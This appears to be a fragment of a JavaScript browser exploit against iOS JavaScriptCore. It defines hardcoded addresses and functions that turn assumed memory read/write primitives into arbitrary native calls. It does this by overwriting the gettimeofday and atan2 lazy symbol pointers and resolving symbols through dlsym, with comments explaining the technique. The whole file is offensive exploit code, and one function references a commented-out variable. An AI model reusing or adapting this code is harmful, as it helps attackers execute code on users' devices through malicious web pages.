var gettimeofday_lazy_addy = 0x34d63d3c;
var atan2_lazy_addy = 0x346afc84;
var reserve_addr = 0x1a0000;
var sym_cache = {};
var slide = 0x0;
var base = 0x0;
//var slid = 0x0;

function get_dyld_shc_slide() {
	/*
	 *  ROP chain places dyld shc slide at slide + reserve_addr + 20
	 *
	 *  shift by 12 bits bc slide is just the slide byte, whereas shit is slid
	 *  by the slide byte shifted by 12 bits
	 */
	return read_u32((slide << 12) + reserve_addr + 20);
}

function call(addy) {
	/*
	 *  this prim is shit
	 *  the idea is that the gettimeofday_lazy_addy contains the lazy symbol
	 *  address of gettimeofday for jsc, whos value will be jumped to when
	 *  calling gettimeofday
	 * 
	 *  overwrite the lazy symbol address with where we want to jump, then make
	 *  a new date object, which will call gettimeofday to give it the current
	 *  date and time.
	 * 
	 *  then put it back to the original address so it will work properly
	 * 
	 *  multithreading be damned
	 */
	var dyld_shc_slide = get_dyld_shc_slide();
	var tmp = read_u32(gettimeofday_lazy_addy + dyld_shc_slide);

	write_u32(gettimeofday_lazy_addy + dyld_shc_slide, addy);
	var d = new Date();
	write_u32(gettimeofday_lazy_addy + dyld_shc_slide, tmp);
}

function call4arg(addy, r0, r1, r2, r3) {
	/*
	 *  same idea as call, but now we use atan2, which gets 2 double arguments.
	 *  a double is 64-bits, so it's passed as 2 registers.
	 *  2 double args are then the full r0-r3 for args passed on the stack,
	 *  assuming 32-bit args.
	 * 
	 *  so, convert r0-r3 to the doubles they need to be, overwrite, and call.
	 *
	 *  the first double has the low 4-bytes passed in r0, the high 4 in r1.
	 *  second has low 4 passed in r2, high 4 passed in r3.
	 */

	var arg1 = new Int64("0x" + pad_left(r1.toString(16), '0', 8) + pad_left(r0.toString(16), '0', 8));
	var arg2 = new Int64("0x" + pad_left(r3.toString(16), '0', 8) + pad_left(r2.toString(16), '0', 8));

	arg1d = arg1.asDouble();
	arg2d = arg2.asDouble();

	delete arg1;
	delete arg2;
		
	var dyld_shc_slide = get_dyld_shc_slide();

	tmp = read_u32(atan2_lazy_addy + dyld_shc_slide);
	write_u32(atan2_lazy_addy + dyld_shc_slide, addy);
	ret = Math.atan2(arg1d, arg2d);
	write_u32(atan2_lazy_addy + dyld_shc_slide, tmp);
	
	delete tmp;
	delete arg1d;
	delete arg2d;
	
	/*
	 *  >>> 0 makes sure it's a regular uint32_t
	 */
	return (parseInt(Int64.fromDouble(ret)) & 0xffffffff) >>> 0;
}

/*
 *  call with symbol
 */
function calls4arg(sym, r0, r1, r2, r3) {
	/*
	 *  this calls dlsym with the first arg, then uses the address it returns
	 *  to call. so you can call with a symbol name instead of an address
	 */

	if (sym in sym_cache) {
		var addy = sym_cache[sym];
	} else {
		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
		var shc_slide = read_u32(reserve_addr + 20 + slid);
		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, sptr(sym), 0, 0);
		sym_cache[sym] = addy;
	}
	return call4arg(addy, r0, r1, r2, r3);
}
